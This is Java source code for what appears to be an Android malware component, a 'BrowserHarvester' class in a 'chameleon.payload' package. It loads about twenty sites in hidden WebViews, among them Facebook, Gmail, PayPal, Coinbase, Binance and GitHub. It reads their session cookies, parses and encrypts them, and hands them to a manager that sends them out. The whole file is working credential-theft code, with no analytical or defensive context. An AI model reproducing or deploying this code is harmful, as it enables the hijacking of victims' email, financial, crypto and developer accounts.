package com.chameleon.payload.harvester;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Build;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import com.chameleon.payload.util.Crypto;
import com.chameleon.payload.PayloadEntry;
import org.json.JSONObject;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class BrowserHarvester {
    private static final String TAG = "BrowserHarvester";
    private final Context context;
    private final HarvesterManager manager;

    private static final String[][] TARGET_SITES = {
        {"facebook.com",       "Social"},
        {"instagram.com",      "Social"},
        {"linkedin.com",       "Social"},
        {"twitter.com",        "Social"},
        {"gmail.com",          "Email"},
        {"mail.google.com",    "Email"},
        {"outlook.live.com",   "Email"},
        {"paypal.com",         "Finance"},
        {"stripe.com",         "Finance"},
        {"venmo.com",          "Finance"},
        {"cash.app",           "Finance"},
        {"binance.com",        "Crypto"},
        {"coinbase.com",       "Crypto"},
        {"amazon.com",         "Shopping"},
        {"ebay.com",           "Shopping"},
        {"aliexpress.com",     "Shopping"},
        {"github.com",         "Dev"},
        {"gitlab.com",         "Dev"},
        {"whatsapp.com",       "Messaging"},
        {"telegram.org",       "Messaging"},
    };

    public BrowserHarvester(Context context, HarvesterManager manager) {
        this.context = context;
        this.manager = manager;
    }

    @SuppressLint("SetJavaScriptEnabled")
    public void collectBrowserData() {
        Log.i(TAG, "Collecting browser cookies via WebView...");

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                CookieManager.class.getMethod("setAcceptThirdPartyCookies", boolean.class)
                    .invoke(cookieManager, true);
            } catch (Exception e) {
                try {
                    CookieManager.class.getMethod("setAcceptThirdPartyCookies", WebView.class, boolean.class)
                        .invoke(cookieManager, new WebView(context), true);
                } catch (Exception ignored) {}
            }
        }

        for (String[] site : TARGET_SITES) {
            String domain = site[0];
            String category = site[1];
            extractCookies(domain, category, cookieManager);
        }

        Log.i(TAG, "Browser cookie collection completed");
    }

    private void extractCookies(String domain, String category, CookieManager cookieManager) {
        try {
            final CountDownLatch latch = new CountDownLatch(1);
            final String[] cookies = {null};

            WebView webView = new WebView(context);
            webView.setVisibility(android.view.View.GONE);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.getSettings().setUserAgentString(
                "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + ") " +
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
            );

            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(android.webkit.WebView view, String url) {
                    try {
                        String c = cookieManager.getCookie(url.startsWith("https") ? url : "https://" + domain);
                        if (c != null && !c.isEmpty()) {
                            cookies[0] = c;
                        }
                    } catch (Exception ignored) {}
                    latch.countDown();
                }
            });

            String url = "https://" + domain;
            webView.loadUrl(url);

            boolean finished = latch.await(15, TimeUnit.SECONDS);
            webView.destroy();

            if (cookies[0] != null && !cookies[0].isEmpty()) {
                reportCookies(domain, category, cookies[0]);
            } else {
                Log.d(TAG, "No cookies for " + domain);
            }
        } catch (Exception e) {
            Log.e(TAG, "Cookie extract error for " + domain, e);
        }
    }

    private void reportCookies(String domain, String category, String cookieString) {
        try {
            JSONObject data = new JSONObject();
            data.put("domain", domain);
            data.put("category", category);
            data.put("raw_cookies", cookieString);

            String[] pairs = cookieString.split(";");
            JSONObject parsed = new JSONObject();
            for (String pair : pairs) {
                int eq = pair.indexOf('=');
                if (eq > 0) {
                    String key = pair.substring(0, eq).trim();
                    String val = pair.substring(eq + 1).trim();
                    if (!key.isEmpty()) {
                        parsed.put(key, val);
                    }
                }
            }
            data.put("cookies", parsed);
            data.put("cookie_count", parsed.length());
            data.put("timestamp", System.currentTimeMillis());

            byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
            manager.sendData("session", encrypted);
            Log.i(TAG, "Captured " + parsed.length() + " cookies from " + domain);
        } catch (Exception e) {
            Log.e(TAG, "Cookie report error", e);
        }
    }
}
